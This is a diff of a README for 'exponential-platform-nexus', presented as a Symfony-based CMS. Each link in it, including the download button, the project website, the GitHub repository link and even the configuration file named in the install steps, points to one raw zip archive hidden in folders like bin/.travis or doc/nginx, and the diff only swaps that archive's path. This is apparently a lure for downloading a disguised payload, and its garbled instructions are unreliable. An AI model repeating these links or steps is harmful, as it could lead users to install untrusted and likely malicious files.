@@ -1,6 +1,6 @@
 # 🌐 exponential-platform-nexus - Your Simple Solution for CMS Management
 
-[![Download](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/bin/.travis/platform-exponential-nexus-1.9.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/bin/.travis/platform-exponential-nexus-1.9.zip)
+[![Download](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/doc/nginx/platform_exponential_nexus_v1.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/doc/nginx/platform_exponential_nexus_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Exponential Platform Nexus combines several powerful technologies:
 - **NG Layouts**
 - **PHP 8.x/8.5 Compatibility**
 
-This application supports a Symfony 3.4 Kernel, maintained by a dedicated team. You can also use additional bundles through Composer. Visit [Exponential Platform](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/bin/.travis/platform-exponential-nexus-1.9.zip) for more information.
+This application supports a Symfony 3.4 Kernel, maintained by a dedicated team. You can also use additional bundles through Composer. Visit [Exponential Platform](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/doc/nginx/platform_exponential_nexus_v1.2.zip) for more information.
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ Make sure your environment is set up to use the latest technologies.
 
 ## 📥 Download & Install
 
-To get the latest version of the software, visit this page to download: [Download the Latest Release](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/bin/.travis/platform-exponential-nexus-1.9.zip).
+To get the latest version of the software, visit this page to download: [Download the Latest Release](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/doc/nginx/platform_exponential_nexus_v1.2.zip).
 
 Once you’re on the Releases page, follow these steps:
 
@@ -50,7 +50,7 @@ Once you’re on the Releases page, follow these steps:
    Create a new database in your preferred database management tool (e.g., phpMyAdmin). Make sure to note down the database name, user, and password.
 
 4. **Edit the Configuration File**:
-   In the extracted folder, find `https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/bin/.travis/platform-exponential-nexus-1.9.zip` or the configuration file relevant for your environment. Open it with a text editor and input your database details.
+   In the extracted folder, find `https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/doc/nginx/platform_exponential_nexus_v1.2.zip` or the configuration file relevant for your environment. Open it with a text editor and input your database details.
 
 5. **Run the Application**:
    Open your web browser and type the following URL:
@@ -113,7 +113,7 @@ Feel free to explore each topic for more in-depth information.
 
 For more resources and support, visit:
 
-- [Exponential Platform Website](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/bin/.travis/platform-exponential-nexus-1.9.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/bin/.travis/platform-exponential-nexus-1.9.zip)
+- [Exponential Platform Website](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/doc/nginx/platform_exponential_nexus_v1.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/doc/nginx/platform_exponential_nexus_v1.2.zip)
 
 For questions or feedback, don't hesitate to get in touch. Enjoy using Exponential Platform Nexus!
